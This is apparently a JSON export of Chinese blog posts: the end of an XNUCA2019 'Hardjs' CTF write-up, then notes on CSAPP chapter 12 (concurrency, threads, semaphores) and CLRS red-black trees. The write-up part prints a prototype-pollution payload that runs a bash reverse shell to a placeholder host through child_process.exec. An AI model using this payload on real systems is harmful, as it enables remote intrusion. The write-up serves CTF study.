\u0026#34;outputFunctionName\u0026#34;:\u0026#34;_tmp1;global.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;bash -c \\\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx/xx 0\u0026gt;\u0026amp;1\\\u0026#34;\u0026#39;);var __tmp2\u0026#34;, } } }, \u0026#34;type\u0026#34;: \u0026#34;test\u0026#34; } \r\n发送5次请求，然后访问/get进行原型链污染，最后访问/或/login触发render函数，成功反弹shell并getflag\n\r\n总结 原型链危害不小，不过找到合适的利用点也很花费审计的时间和精力，原先还以为这是个非预期，投稿的时候看到WP才知道这也在出题师傅的意料之中，tql。\n参考链接 https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html\nhttps://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/\nhttps://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/\nhttps://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs\nhttps://www.anquanke.com/post/id/177093\n","date":"2019-08-30T00:00:00Z","permalink":"https://example.com/p/xnuca2019-hardjs-writeup/","title":"XNUCA2019 Hardjs题解 从原型链污染到RCE"},{"content":"本文为CSAPP第十二章的阅读笔记，参照的是英文书，专业名词翻译可能不准确，配合原书食用更佳。\n12.0 并发就是逻辑流上的同时发生，运行。在计算机系统的不同层面上都有所体现。并发是系统内核运行多个应用程序的一种机制，当然也不只限于内核。\n应用层级的并发有以下例子：\n 访问缓慢的I/O设备 与人类互动 通过推迟操作来减低等待时间 服务多个网络客户端 在多核机器上进行并行计算  使用应用层级并发技术的程序叫并发程序。操作系统提供3种基本方法来编写并发程序：\n 进程 I/O复用 线程  12.1 通过进程实现 最简单的实现并发的方式就是通过多进程，具体是利用fork, exec 和waitpid等相关函数。\n书上在这里给了一个服务器程序作为例子。首先假设有2个客户端和1个服务端，服务端监听一个listening descriptor (假设是3)。然后假设，从客户端收到一个链接请求，返回了一个connected descriptor (假设是4)。接着服务器fork出一个子进程，子进程关闭自己的listening descriptor 3，父进程关闭connected descriptor 4，然后子进程开始响应客户端的请求，父进程继续监听。因为子进程和父进程都指向相同的文件表入口(file table entry)，所以如果父进程不关闭connected descriptor 4，那就会导致内存泄露，消耗有效内存导致系统崩溃。在这之后如果客户端2向listening descriptor 3发起请求，那么就返回connected descriptor 5并重复以上过程。\n考虑到服务器一般都是长时间运行，所以在976页的代码中4到9行包含了一个SIGCHLD处理器来捕获僵尸子进程。因为SIGCHLD处理器执行的时候SIGCHLD信号是被阻塞的，Linux的信号处理又不是队列的，所以需要这个SIGCHLD处理器去捕获多个僵尸子进程。\n 这种实现方式有个很明确的特点，文件表是共享的但用户地址空间不是。所以一个进程是不可能意外访问到其他进程的虚拟内存，这也保证不会有很多奇怪的错误。如果进程要共享信息那就需要使用IPC机制，但是这就会导致速度变慢。\n12.2 通过I/O复用实现 现在假设我们有一个服务器程序既要响应客户端网络请求，又要响应用户(管理员)的输入。那么不管我们先监听哪个事件都不怎么好，所以我们需要I/O复用这种技术来同时监听多个事件。基本思想就是使用select函数去要求内核挂起进程，在一个或更多个I/O事件发生后返回控制权给应用程序。\nint select(int n, fd_set *fdset, NULL, NULL, NULL); 我们只关注select函数的前2个参数，第二个参数类型为fd_set，表示一个descriptors集合，实际上就是一个n长度的bit向量*$b_{n-1},\u0026hellip;.,b_1,b_0$*。 每个$b_k$都对应响应一个descriptor k。如果$b_k$是1，那么这个descriptor k就是fd_set的有效成员。除了声明和赋值以外，你只能用FD_ZERO等宏来操作fd_set。第一个参数一般是descriptors集合的最大基数。 返回值是ready descriptors的个数，如果出错就返回-1。\n当一个向descriptor k读1 byte的请求不会被阻塞的时候，这个descriptor就是ready的。我们向select传入fdset后，执行fdset的指针会被指向fdset的一个子集 ready set。所以我们每次都要更新传入select的fdset的指针。\n书上给出的示例代码先声明了一个read_set，然后把stdin和服务器监听的listenfd添加到read_set，然后开始死循环。每次循环先把read_set的值赋予ready_set，调用select并传入ready_set。在select后面添加判断代码，依次判断是否有来自用户的输入或者客户端的了解并分别响应。\n不过， 这样的程序还有个问题就是如果服务器如果正在响应客户端，那么你的输入得一直等到客户端断开连接才会有响应。比较好的方法是在一个更出色的颗粒度上运行，对客户端的响应分开进行，比如如果客户端输入多行，一次就输出一行。\n12.2.1 基于I/O复用的并发事件驱动服务器 事件驱动程序就是说把逻辑流当成state machines。state machines大概就是状态(states)，输入事件(input events)和将他们映射起来的转换(transitions)的集合。每个输入事件会触发一个转换，导致当前事件转换到下一个事件。\n对于这节提到的服务器来说，每当1个新的客户端k链接，就创建一个事件机器$s_k$然后把它和connected descriptor $d_k$ 链接起来。然后服务器用select去捕获输入事件(也就是connected descriptor变成可以read的状态)，服务器为对于的状态机器执行转换(在这个例子里就是从descriptor读取并输出文本)。\n整个过程就是，先用 init_pool 初始化一个pool，这个pool包含了一个active 客户端的集合。然后通过select捕获2种输入事件，一种是有新的客户端链接，一种是已连接的客户端可以被read。当捕获到新的链接就通过 add_client 添加到pool里。然后通过check_clients来检查所有客户端是否可以read的状态，可以就read并输出。如果check的时候检测到了EOF，那就是客户端关闭了链接，那我们就可以关闭这个客户端，更新pool，把对于的descriptor去掉。\n I/O复用的优点有：\n 比起基于进程的设计，程序员能对他们的程序的行为有更多控制，比如我们可以对某些客户端进行某些特定反馈，明显上一节的程序是很难做到的。 事件驱动的服务器运行在单个进程里，所以每个逻辑流可以访问整个地址空间，这样不仅有利于信息共享，还有利于你debug。 这种设计一般也比基于进程的设计更加有效，因为他们不需要一个进程来调度新的流。  缺点有：\n 写起来很复杂，并且颗粒度的减低会导致复杂度的提升。这个颗粒度指的是单位时间切片里每个逻辑流执行的指令数量。这个例子中的颗粒度就是读取整段文本的指令数量。 只要某些逻辑流在读一行文本，那么其他逻辑流就不能进行。就容易被恶意客户端攻击，发送一行分离的文本然后关闭，那服务器就会一直等待了。修复这个问题很麻烦，但是基于进程的设计却根本没有这个问题。 不能充分利用多核处理器。  12.3 通过线程实现 线程有以上2种方法的特性。一个线程就是一个运行在线程上下文的逻辑流。现代系统允许我们在单核处理器上写一个多线程的程序。每个线程都有自己的线程上下文，包括线程ID，栈，栈指针等，但是共享整个进程的虚拟地址空间。\n12.3.1 线程执行模式 每个进程都开始于一个单线程叫做主线程。主线程可以创建一个peer线程，然后开始并发执行。最后，当主线程执行一些比较慢的system call或者跟timer交互的时候，通过内核context switch来传递控制权给peer线程。peer线程会执行到控制权被传回给主线程为止。因为线程上下文比较小，所以线程的切换比进程更快。另外线程没有严格的父子关系，线程通过线程池与进程联系在一起，独立于由其他线程创建的线程。另外主线程跟其他线程的区别仅是它是第一个开始的。一个线程可以杀死或者等待任何其他平等的线程死亡。\n12.3.2 Posix Threads Posix Threads是一套给C程序操作线程的标准接口。一个线程的代码和本地数据被压缩在thread routine里面，每个thread routine有一个void指针参数，并且返回一个void指针。所以可以自定义结构来传入线程或者传出。\n12.3.3 创建线程 程序通过pthread_create函数创建新的线程，第一个参数是tid的指针，如果创建成功tid就保存在这个指针指向的变量，第二个参数用于改变最新创建的线程的默认属性。第三个参数是线程函数地址，第四个参数是传递给线程的参数。返回值是0则成功，否则则出错。并且线程可以通过pthread_self函数获取自己的线程ID。\n12.3.4 终止线程   当线程的上级线程返回时，线程会被隐式的终止。\n  当调用pthread_exit时，线程会直接终止。如果是主线程调用，那么它会等待所有其他线程退出然后再终止。\n  某个peer线程调用exit函数的时候会终止进程和所有与进程关联的线程。\n  其他线程可以通过pthread_cancel终止当前线程\n  12.3.5 回收被终止的线程 调用pthread_join可以让线程等待其他线程的终止再执行，其第二个参数是一个二级指针，用于保存被等待的线程的返回结果。pthread_join只能探测某一个特定线程终止，不能同时探测多个线程中任一线程终止。\n12.3.6 分离线程 线程要么是joinable(可合并)，要么是detached(被分离)的状态。一个可合并线程可以被其他线程回收(reap)或者杀死。它的内存资源直到它被其他线程回收才会被释放。一个被分离状态的线程不能被其他线程收获或杀死，内存资源是当它终止的时候由系统自动释放的。\n默认情况的线程是可合并状态，为了不内存泄漏，每个线程都应该被其他线程回收或者通过pthread_detach分离。\n线程可以通过pthread_detach(pthread_self()) 来分离自己。\n12.3.7 初始化线程 pthread_once函数可以为一个thread routine初始化一些\u0026quot;状态\u0026quot;。它的第一个参数是一个全局或者静态变量，并且总是初始化为PTHREAD_ONCE_INIT，第二个参数是thread routine函数地址。第一次调用它的时候它会调用一个没有参数也没有返回值的函数init_routine，第二次用相同的参数调用时就什么都不做。\n12.3.8 基于线程的并行服务器 跟基于进程的设计差不多。不过有2个微妙的问题在这种设计。\n 如果我们用一个变量接受Accept返回的描述符，然后把变量的地址传给线程，在线程里再把地址指向的描述符复制给局部变量。这就导致了竞争问题。如果在一个线程的复制语句生效以前，Accept返回了新的描述符，那么就有2个线程得到了一样的描述符，所以就产生了竞争。解决方法是每次都malloc一个新的变量来存储Accept返回的描述符。 为了避免内存泄漏，每个线程要detach自己。  12.4 在线程程序里的共享变量 有3个基本问题来理解一个变量再C程序中是否是被共享的：\n 线程潜在的内存模式是什么 基于这种模式，内存的实例如何被映射到内存 每个实例被多少个线程引用  只有当多个线程引用某个变量的一个实例的时候，这个变量被称为是被共享的。\n12.4.1 线程内存模式 一个池里的并发线程运行在一个进程的上下文里。每个线程都有自己的线程上下文，包括线程ID，栈，栈指针，pc，代码和通用寄存器的值。每个线程都与其他线程共享进程上下文剩余的部分，包括了整个虚拟地址空间，也包括了相同的open files的集合。\n一般情况，一个线程不可能访问其他线程的寄存器，但是任何线程都可以访问其他线程的内存。所有线程的栈一起被放在虚拟地址空间的栈区域，线程一般只能访问自己栈空间，但也可以通过某些方法访问到其他线程的栈。例如示例代码里的26行，通过全局变量ptr就访问到了主线程的栈空间。\n12.4.2 映射变量到内存  全局变量：函数声明的变量就叫全局变量。虚拟内存中的读写区域保存了每个全局变量的一个实例，这个实例可以被所有线程引用。 局部自动变量：在函数内声明的不包含static关键字的变量。在每个线程的栈空间都保存了一个本地自动变量的实例。 局部静态变量：在函数内声明的包含static关键字的变量。跟全局变量一样，只有一个实例存放在虚拟内存中的可读写区域。  12.4.3 被共享的变量 只有当多个线程引用某个变量的一个实例的时候，这个变量被称为是被共享的。例如cnt变量是被共享的，而myid不是。\n然而，像msgs这样的局部变量实际上是可以被共享的。\n12.5 通过信号量同步线程 在这个小节，书上给了一个程序，首先有一个全局变量cnt，然后创建2个线程根据传入的参数，通过循环对cnt进行累加。如果最终cnt是传入的参数的2倍则没有问题，如果不是则报错。\n结果不但出错，而且每次错误结果都不一样。\n从汇编角度看可以帮助理解，我们忽略循环的头尾只看cnt的累加部分：这部分有3条指令。首先cnt的值被取出然后放在累加器rdx里，然后更新累加器rdx，最后把rdx里的值放回cnt。\n首先我们已经知道线程的寄存器是不共享的，就是这里的rdx对于每个线程是不同的，并且，单处理器的机器在执行多线程程序的时候是交错执行机器指令的，所以在某些执行顺序下我们可以得到正确的结果，但是某些顺序下就不能。\n比如，如果我们把cnt的值加载到累加器$rdx_1$里然后更新$rdx_1$，此时$rdx_1$的值是1，然后把cnd的值放到$rdx_2$里并更新，然后把$rdx_1$的值加载到cnt里，最后再把$rdx_2$的值加载到cnt里。我们执行了2次累加但是cnt的值却只加了1。\n我们可以通过一个叫 进度图 的工具的帮助来理解正确的指令执行顺序。\n12.5.1 进度图 n个并发线程的进度图执行模式就是一条穿过n维笛卡尔空间的弹道。\n每个轴对于一个线程，轴上每个点对应线程已经完成了的指令，原点就是任何线程都没有完成任何指令的状态。一条指令的执行就是状态的转换，就是图上一个点到另一个点的一条线。因为程序不能同时完成2个指令，程序也不会回退，所以线只能往右或者上，不能是对角，或者左、下的方向前进。\n回到之前的例子，某些区域的点代表的状态会导致错误的结果，我们就把这些状态空间的区域划分为不安全区域，与之对应的就是安全区域。但是这个不安全区域是不包含边界上的点的。图12.21中穿过边界的弹道是安全的，但是进入区域的弹道就是不安全的。\n为了保证程序的准确性，我们必须找到某些方法同步线程使得他们有安全的弹道，一个经典的方法就是基于信号量。\n12.5.2 信号量 一个信号量，是一个非负的整型全局变量，并且只能由2个叫做P和V的操作改变。\nP(s)：如果s非0，那s减一并立即返回。否则，挂起线程并等待s变成非0与V操作重启线程。在线程重启以后，s减一并返回。\nV(s)：s加一。如果有任何一个线程被P操作阻塞，那么随机重启其中一个。\nP的检测与减一操作是不可分割的，就是说一旦s变成非0，立刻为s减一。同理，V操作的加一操作也是不可分割，加载，增加，储存s必须连续完成。\nPosix标准定义了几个函数来操作信号量。\nsem_init用来初始化信号量，sem_wait就是P，sem_post就是V。后文用P(s)和V(s)来代替sem_wait和sem_post。\n12.5.3 使用信号量协调互斥 信号量可以用来处理对共享变量的相互排斥性操作。基本思想就是把每个共享变量和一个初始化为1的信号量联系起来，然后用P和V围绕对该变量的操作。这样的信号量被叫做二进制信号量，因为它只有0和1两种值。用来提供相互排斥操作的二进制信号量被叫做锁。V操作就是解锁，P操作就是加锁。如果一个线程锁上了锁但没有解锁，那就叫持有锁。用于为一个有效资源集合计数的信号量叫做记数信号量。\n图12.22展示了用信号量同步计数器程序的进度图，那些s小于0的区域被叫做禁止区域，由于信号量的保护，没有一条弹道可以包含禁止区域中的点。所以修改后的示例程序可以得到正确的结果。\n12.5.4 使用信号量调度分享的资源 一个线程可以利用信号量来通知其他线程，程序中的某些情况已经为真。2个经典的例子就是producer-consumer问题，readers-writers问题。\nproducer-consumer 问题 一个生产者和消费者线程共享一个有n个槽的有界缓冲区。生产者重复往里面的空槽插入项目，消费者重复从有效槽取出项目。多个生产者和消费者问题也是类似的。\n我们需要控制访问排他性，但不足以解决这个问题。我们还需要调度对缓冲区的访问。如果缓冲区满了，那么生产者就要等待空槽，反过来也是一样。现实系统中的多媒体系统和图形用户接口就是2个这样的例子。\n本节会构建一个包叫做$S_{BUF}$并在下一节使用。$S_{BUF}$构造一种数据类型s_buf，包括一个动态申请的数组，还有记录数组的大小变量，记录第一个和最后一个有效变量的位置的变量，一个保护访问数组的锁，一个计数有效槽的信号量。，一个计数空槽的信号量。\n包里的sbuf_init函数会初始化各个变量，sbuf_deint会释放数组，sbuf_insert会在有空槽的时候插入新的项目。sbuf_remove会在有有效项的时候返回有效现并移除（通过移动记录首个有效位置的变量）。\nreaders-writers 问题 这个问题是互斥问题的概况。共享对象指可以被多个线程访问的存在内存，数据库或者磁盘的对象。修改共享对象的线程叫做writer，只读取共享对象的线程叫做reader。writer必须有互斥性的权限去访问共享对象，但理论上可以同时有无限个readers与writers共处。\n这个问题有几个变种，每个都是基于readers和writers的优先级。\nfirst readers-writers problem趋向于readers。readers永远不用等待，除非在第一个readers执行read之前已经有writer获得互斥访问权。\nsecond readers-writers problem趋向于writers。只要一个writer准备去操作，那么他的操作必须尽可能早被实现。\n图12.26展现了一个解first readers-writers problem的方案。w信号量控制对共享对象的访问，而mutex信号量控制对共享变量readcnt的访问。readcnt记录的是当前有多少个reader访问共享对象。\n在这个代码里，只有第一个reader会锁上w，最后一个reader会解锁w。不过这有一个问题，如果有源源不断的reader访问，那么writer将永远等待。\n12.5.4 基于预线程的并发服务器 之前的基于线程的并发服务器有一个缺点就是消耗的资源过多，每个客户端都有一个线程处理。而基于预线程的技术可以减少对资源的消耗。\n首先我们创建一个主线程接受客户端链接，并且预先创建几个worker线程，还有一个存放描述符的有界缓冲区。主线程会把接受到的描述符放到缓冲区的空槽，worker会移除并取出缓冲区中的描述符然后对客户端进行响应。响应的函数是echo_cnt，在这个函数还有主函数我们都用到了sbuf包。sbuf包是需要进行初始化的，初始化有2种方法。一种是在主线程里手动执行，另一种就是在echo_cnt里用pthread_once来进行初始化。这种方法可以让这个包更容易被使用，但是缺点是大多数时候都回执行pthread_once做无用功。\n12.6 使用线程实现并行 运行在多处理器系统上的并发程序就是并行程序。并行程序不像并发程序是线性执行的，一个最直接简单的方法利用并行就是把一个任务分成多个部分并让多个线程分别完成自己的任务。\n假设我们要实现一个0到n的累加，那么我们可以把结果储存在一个全局共享变量。图12.31的代码中，传递一个小数字给线程作为线程ID，然后根据这个ID计算线程自己需要计算的范围，然后进行自己的累加工作。最后通过一个closed-form的解决方案验证结果。\n当我们运行图12.31的代码在一个4核处理器系统里，并且让n=$2^{32}$，记录不同线程数量下的运行时间，可以发现一个很惊讶的结果。不只是单线程很慢，在以多线程并行的程序几乎一样慢，并且核心更多更慢。\n主要原因是同步开销在并行程序上很大，应该尽可能的避免，如果无法避免，那尽量让有效操作来摊销。\n在这个程序里一个避免使用信号量的方法就是让每个线程计算后的结果放在自己的私有变量而不是操作共享变量。在图12.33，我们可以定义一个全局数组来储存结果，每个线程操作数组的一个元素，最后把所有数组的元素加起来。那么唯一需要使用同步的就是主线程等待子线程的计算完成了。\n结果测试可以明显发现这种方法在四核系统上的速度快得多。\n我们在图12.34中通过操作本地变量而不是一直对数组进行操作可以减少对全局变量的引用，进一步加快速度。\n并行程序的特征表现 通过图12.35，可以发现在这种模式下随着线程增加到4个，速度有明显下降，但在之后就没太多变化。并且这种减少跟核心数是线性相关的，就是说，每双倍增加线程，就会降低一半的时间。在4线程之后增加线程会多出一点点时间，因为每个核心还要调度线程。所以一般并行程序会写成每个核心运行一个线程。\n并行程序的加速公式是 $S_p = T_1 / T_p$ ，这种格式被认为是strong scaling，p指的是核心数，$T_k$指在k个核心下的运行速度。当$T_1$是单线程版本的程序执行时间，$S_p$叫做绝对加速比。当$T_1$是并行版本上单核心程序的运行时间，$S_p$叫做相对加速比。绝对加速比比先对加速比更能体现并行的效果。同步的开销会使得相对加速比的数字膨胀。\n有效性定义为：$E_p = S_p/p = T_1/pT_p$ ，$E_p$的结果是百分比，它可以计算由于并行导致的开销。$E_p$越高证明有效的操作越多。\n加速比的另一个视角被认为是weak scaling，它会随着处理器的个数提升问题的规模，从而随着处理器数量提升而每个核心处理的问题维持在一个常数。这种格式下的加速比和有效性表现为每个单位时间内被完成的工作的总数。例如，如果我们增加一倍的处理器，可以在单位时间内做到2倍的工作，那么我们就得到线性的加速和100%的有效性。\nweak scaling经常比strong scaling更有真实。有些程序的问题规模容易提升，这就适合weak scaling，否则就适合strong scaling。\n12.7 其他并发问题 12.7.1 线程安全 一个函数如果被多线程重复调用时总能产生正确结果的时候，我们把它叫做线程安全的。否则就是线程不安全的。\n我们可以定义4种不同类别的线程不安全的函数。\n 没有保护共享变量的函数。这种函数只要加上同步操作P和V就可以变成线程安全的。 在多次调用中保持状态的函数。例如图12.37的函数，当调用一次srand后，重复调用rand我们可以得到一个可预测的序列，但如果通过多线程调用就不能预测了。使这样的函数变成线程安全需要重写，将状态(这里的next_seed)作为参数传入，而不是使用静态的变量。 返回一个指向静态变量指针的函数。当多个线程调用这种函数的时候，一个线程将要使用的返回值容易被另一个线程修改。有2种方法可以解决。一种是修改代码，传递一个指针参数来存放结果。一种是加锁，然后把返回值复制了之后在解锁。 调用线程不安全函数的函数。如果函数f调用了线程不安全的函数g，g如果是第三种函数则f必定是线程不安全的，g如果是1、3种，那么只要给这个函数加了锁，那么f就是线程安全的。  12.7.2 可重入性 没有引用任何共享变量的函数是一类重要的线程安全函数，被叫做可重入函数。可重入函数更加高效因为它不需要同步操作。有一种修改第二类线程不安全函数的方法就是把它重写成可重入函数，图12.40就是一个可重入版本的rand函数，主要思想就是把静态变量next改成一个调用者传入的指针。\n如果一个函数传入的是值，并且只有对局部变量的引用，那么它是显式可重入函数。但如果，我们允许它传入的是指针，那么它是隐式可重入函数。只有当调用者传入的函数不是共享变量的时候，隐式可重入函数才是可重入函数。但一般我们说的可重入函数包括这2者。\n12.7.3 在线程编程里使用已知的库函数 本节介绍了一些比较常见的线程不安全的库函数。对于这些函数我们最少要做到上锁并复制返回值，但是这样有很多缺点并且也不是对每个库函数都适用，所以推荐使用Linux提供的可重入版本的函数，一般是在函数名增加后缀_r。\n12.7.4 竞争 当程序的正确依赖于一个线程达到点x必须在另一个程序达到点y之前的时候，竞争就产生了。示例程序里创建了4个线程，并把循环变量的值作为线程ID，并把地址传给了它们，每个线程会输出它们的ID。很明显，当地址传递给了线程之后，如果循环变量i在被主线程增加之前线程复制了i的值，那么结果就是正确的，但如果执行顺序不是这样就会出错。主线程和其他线程就产生了竞争。消除竞争的方法是为每个线程动态申请内存，当然为了不内存泄漏要记得释放内存。\n12.7.5 死锁 信号量会导致一种潜在的运行错误，死锁，即一部分线程在等待某些永远不会成真的状态。进度图在理解死锁非常有用。在图12.44展现了一个使用2个锁的程序，我们可以看到由于程序员以不正确的顺序调用了P和V操作，导致2个禁止区域重叠，所以当程序走到死锁区域的时候它就无法再前进了。换句话说，它被\u0026quot;死锁\u0026quot;住了。程序可以进入死锁区域，但是永远无法出去。\n死锁是一个很严重的问题，因为程序不一定会进入死锁区域。所以很有可能你跑了它很多次都没问题，但是别人却一次就出错了，并且问题也不容易复现。\n预防死锁是一个很困难的问题，但是对于二进制信号量，只要遵循简单但有效的规则就可以有效规避这个问题。那就是：给定所有锁的一个顺序，如果每个线程按照这个顺序上锁并逆向解锁，那么这个程序不会被锁死。\n","date":"2018-12-16T23:32:43Z","permalink":"https://example.com/p/csapp-chapter-12/","title":"CSAPP十二章阅读笔记"},{"content":"CLRS红黑树章节阅读心得\n什么是红黑树 红黑树是二叉树搜索(BST)的一个变种，所以简单提一下BST，BST是一颗二叉树，其中的每个结点都有p, left, right和key的属性，前面三个分别是指向父节点，左孩子，右孩子的指针，并且结点的左子树的结点key值必定小于等于该结点的key值，右子树同理，大于等于。\n在最差情况下BST中的结构会呈链表状，这就导致操作花费O(n)的时间，而完全二叉树和平衡二叉树则可以保证在最差情况下的表现也比较好。红黑树就是一颗平衡二叉树(平衡二叉树的每个节点的左子树和右子树的高度最多差为1)。\n红黑树的结点比BST的结点多出一个color属性，其值可能为red或black。红黑树有以下性质：\n 每个结点的颜色非红即黑 根结点的颜色是黑的 叶子(NIL)的颜色是黑的 如果一个结点的颜色是红的，那么他的子结点一定是黑的 对于每个结点，所有从它出发到叶子的简单路径包含相同数量的黑色结点  我们把一个结点的简单路径上除其本身之外包含的黑色结点数量叫做black-height(黑高)。\n由于\n 引理13.1：具有n个结点的红黑树的高最多为2lg(n+1)\n 我们可以知道，动态操作Search、Minimum、Maximum、Successor和Predecessor在红黑树中花费是时间是O(lgn)。 下面为了便于处理红黑树代码的边界条件，使用一个哨兵T.nil来代替NULL。T.nil跟其他结点有相同属性，但除color为黑以外其他属性不重要。\n证明引理13.1 证明：我们先证明以任一结点x为根的子树至少包含$2^{bh(x)}-1$个内部结点。通过数学归纳法来证。\n如果x高度为0，那就是叶子结点，所以其内部结点为$2^{bh(x)}-1$ = 0。 对于高度大于0的结点x，因为我们把指向的NIL也当做子结点，所以其子结点一定有2个，并且黑高为bh(x)或bh(x)-1，所以由假设可得子结点至少有$2^{bh(x)-1}-1$个内部结点，所以x至少有$(2^{bh(x)-1}-1)+(2^{bh(x)-1}-1)+1=2^{bh(x)}-1$个内部结点，证明完毕。\n然后根据红黑树的性质5，从根到叶子的简单路径上，至少一半的结点是黑色，所以根结点的黑高至少为h/2。 所以 $n≥2^{h/2}-1$，我们把1移到左边然后取对数有$lg(n+1)≥h/2$，也就是$h≤2lg(n+1)$ 证明完毕。\n旋转 因为BST中的插入和删除如果直接作用于红黑树可能会导致结果违反红黑树的性质，所以我们需要改变树中某些结点的颜色和指针结构来维护性质。改变指针结构就是用rotation(旋转)来完成。旋转有左旋和右旋。对结点x左旋的时候需要假设其右孩子y不是NIL，左旋是以x到y的链为“支链”，使得y代替x成为子树的新结点，x成为y的左孩子，而y的左孩子则成为x的右孩子。右旋同理。 LEFT-ROTATE(T,x) y = x.right\t//设置y x.right = y.left\t//把y的左子树移动成x的右子树 if y.left ≠ T.nil y.left.p = x y.p = x.p\t//设置y的父节点为x的父结点 if x.p == T.nil T.root = y elseif x == x.p.left x.p.left = y else x.p.right = y y.left = x\t//把x放到y的左边 x.p = y 左右旋都花费O(1)的时间。\n插入 向有n个结点的红黑树插入一个新结点花费O(lgn)时间，插入时先按照BST的插入方式插入再把新插入结点着色为红色，然后再通过一个RB-INSERT-FIXUP函数来对结点重新着色和旋转。\nRB-INSERT(T,z) y = T.nil x = T.root while x ≠ T.nil y = x if z.key \u0026lt; x.key x = x.left else x = x.right z.p = y if y == T.nil T.root = z elseif z.key \u0026lt; y.key y.left = z else y.right = z z.left = T.nil z.right = T.nil z.color = RED RB-INSERT-FIXUP(T,z) 重点是RB-INSERT-FIXUP是如何工作的：\nRB-INSERT-FIXUP(T,z) while z.p.color == RED if z.p == z.p.p.left y = z.p.p.right if y.color == RED z.p.color = BLACK\t//情况1 y.color = BLACK\t//情况1 z.p.p.color = RED\t//情况1 z = z.p.p\t//情况1 else if z == z.p.right z = z.p\t//情况2 LEFT-ROTATE(T,z)\t//情况2 z.p.color = BLACK\t//情况3 z.p.p.color = RED\t//情况3 RIGHT-ROTATE(T,z.p.p)\t//情况3 else (same as then clause with \u0026quot;right\u0026quot; and \u0026quot;left\u0026quot; exchanged) T.root.color = BLACK 以下为范例，插入某结点后通过这个函数来修复被破坏的结构。 分析修复过程 修复过程是为了维护红黑树的性质，插入结点后可能被破坏的只有性质2(根结点为黑色结点，当插入的树为空树)和性质4(红结点的子结点为黑结点)。\n分析三种情况 首先，这个循环的大前提是z的父节点为黑色，另外以下分析建立在z的父节点为左孩子的情况下，右孩子的情况是类似的，伪代码里也省略了这一部分。 情况1： z的叔结点y(z.p.p.right)是红色的情况。 我们把y和z的父节点的颜色着色为黑，y的父节点着色为红，然后把z上移2层，指向原先的z的祖父结点。 这种情况下，原先的z的父节点被着色为黑，所以原先的z不会再破坏红黑树的性质4，但是其祖父结点被着色为红有可能导致其破坏红黑树性质4，所以把z上移继续循环。 另外，原先的子树α，β，γ，δ和ε都有一个黑色根结点，最后也只有一个黑色根结点，所以性质5没有被破坏。(图13-5) 情况2： y是黑色且z为右孩子。 z指向了父节点再对z进行左旋。 这么做只是把情况2变成情况3并进入情况3的处理。 情况3 : y是黑色且z为左孩子。 把z的父节点着色为黑，祖父结点着色为红，然后对祖父结点进行右旋操作。 与情况1相似，所有子树的黑根结点树没有改变，同时路径中不会再出现连续的2个红色结点，所以性质4和5都满足。(图13-6) 证明 使用循环不变量来证明上述过程： 首先这个循环不变量是： a. 结点z是红色的 b. 若z.p是根结点，则z.p是黑结点 c. 若红黑树性质被破坏，则至多只有一个性质被破坏，要么是性质2，要么是性质4。 初始化： 在循环第一次迭代前，插入了一个红结点z。接下来就证明循环不变量各部分成立。 a. 插入的是红色的必定成立。 b. 如果z.p是根，那么开始的时候是黑的，并且循环开始前是不变的。 c. 循环开始前，性质1、3、5是成立的。若违反了性质2，那么插入的是根结点，所以其父节点是T.nil，满足性质4。若违反了性质4，那么由于z的子节点是T.nil，并且在z加入前该树的性质没有被违反，所以必定是由于z.p和z都是红色违反了该性质。 保持： 循环会开始是因为z.p是红色的，所以由性质2和4我们知道z.p.p必定存在且为黑色的。 a. 三种情况下z最后都指向红色结点，所以a是满足的。 b. 情况1结束的时候z.p的颜色并没有被改变过，所以若其本来是根结点，则z.p是黑色的。情况2会被转换成情况3继续执行，情况3把z.p着色为黑色的，无论其是否为根结点。所以b是满足的。 c. 分析情况1的时候我们已经证明了性质5不会被破坏，显然性质1和3也不会被破坏，若情况1结束的时候z是根结点，则破坏了性质2，但不会破坏性质4因为根结点的父节点是黑色的T.nil，若情况1结束的时候z不是根结点且z.p是红色的，则破坏了性质4但不破坏性质2，所以情况1满足c。 情况3结束的时候，性质1、3、4、5都是满足的。同时，由于z在情况2、3中不可能是根结点，所以性质2也满足。因此情况2、3也满足c。 终止： 循环终止是因为z.p是黑的(若z是根结点，那么z.p是黑色的T.nil)。这样，终止的时候树不会违反性质4。根据循环不变量，唯一可能不成立的只有性质2，所以最后一行就恢复了这个性质。所以最后RB-INSERT-FIXUP终止时，所有红黑树性质成立。\n分析 由于红黑树高度为O(lgn)，所以RB-INSERT除修复部分花费的时间为O(lgn)。而修复过程中只有情况1的时候才会继续循环，且每次上升2层，所以循环可能会被执行的时间是O(lgn)。因此，总花费时间为O(lgn)。另外旋转不会超过2次，因为一旦进入情况2或情况3，while就结束了。\n删除 删除与其他操作一样也花费O(lgn)时间。 与二叉树一样，我们需要准备一个子函数RB-TRANSPLANT来将某个结点v替换掉结点u。\nRB-TRANSPLANT(T,u,v) if u.p == T.nil T.root = v elseif u == u.p.left u.p.left= v else u.p.right = v v.p = u.p 这个函数先判断u的父节点是否为T.nil，如果是则改变T.root为v结点，否则就再通过判断u是u父结点的左孩子还是右孩子来使其父结点的某个指针指向v，然后在把v的父节点指向u的父结点。\n然后就是正戏RB-DELETE\nRB-DELETE(T,z) y = z y-original-color = y.color if z.left == T.nil x = z.right RB-TRANSPLANT(T,z,z.right) elseif z.right == T.nil x = z.left RB-TRANSPLANT(T,z,z.left) else y = TREE-MINIMUM(z.right) y-original-color = y.color x = y.right if y.p == z x.p = y else RB-TRANSPLANT(T,y,y.right) y.right = z.right y.right.p = y RB-TRANSPLANT(T,z,y) y.left = z.left y.left.p = y y.color = z.color if y-original-color == BLACK RB-DELETE-FIXUP(T,x) 分析删除过程 分析这个函数的过程。 先让y指向要被删除的结点z，并记录下y原来的颜色。 然后4到8行在z只有一个孩子的情况下，用z的孩子代替了z的位置，并且让x指向该孩子，而如果z有2个孩子进入10到21行。 